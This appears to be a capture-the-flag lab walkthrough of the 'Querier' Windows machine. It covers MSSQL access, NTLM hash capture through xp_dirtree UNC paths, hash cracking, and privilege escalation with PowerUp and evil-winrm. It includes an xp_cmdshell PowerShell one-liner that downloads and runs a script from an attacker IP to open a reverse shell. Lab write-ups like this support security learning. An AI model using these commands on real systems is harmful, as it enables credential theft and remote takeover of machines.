# Querier - Walkthrough (Windows)

## 🧗 Initial Foothold

### 🔌 1. Port and SMB Enumeration
- Found **port 1433 (MSSQL)** open.
- Also found an open **SMB share**.
- Downloaded and unzipped contents — found `vbaProject.bin`.
- Ran `strings` on `vbaProject.bin` → extracted credentials.

### 🛠️ 2. Logging into MSSQL
- Used credentials with:
```bash
impacket-mssqlclient user@10.10.x.x
```

### 📤 3. Enumerating via UNC Paths
- Started SMB server on attacker machine:
```bash
impacket-smbserver ninjafolder $(pwd) -smb2support
```

- On target (inside MSSQL), ran:
```sql
EXEC xp_dirtree '\10.10.16.21\ninjafolder\file'
EXEC xp_fileexist '\10.10.16.21\ninjafolder\file'
```

- Captured **hash + username**, cracked with `john`.

### 🪟 4. Reverse Shell via xp_cmdshell + PowerShell
- Logged in again with stronger user.
- Enabled `xp_cmdshell`, then:
```sql
EXEC xp_cmdshell 'powershell "IEX(New-Object Net.WebClient).downloadString(''http://10.10.16.21/shell.ps1''); Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.21 -Port 445"';
```

> Full setup referenced here:  
> [powershell reverse shell notes](obsidian://open?vault=Obsidian%20Vault&file=powershell%20and%20cmd%20commands%20for%20rev%20shell)

---

## ⚙️ Privilege Escalation

### 🔍 1. Local Enumeration
- Uploaded and executed `PowerUp.ps1`

### 🔑 2. Cleartext Admin Creds
- Found **Administrator password** in output.
- Logged in via:
```bash
evil-winrm -i 10.10.x.x -u Administrator -p 'password'
```

---

## 🧠 Notes
- MSSQL + xp_dirtree is a great method for capturing NTLM hashes.
- `PowerUp.ps1` is very effective for catching creds in plaintext or config files.
- xp_cmdshell is gold if enabled or can be re-enabled.
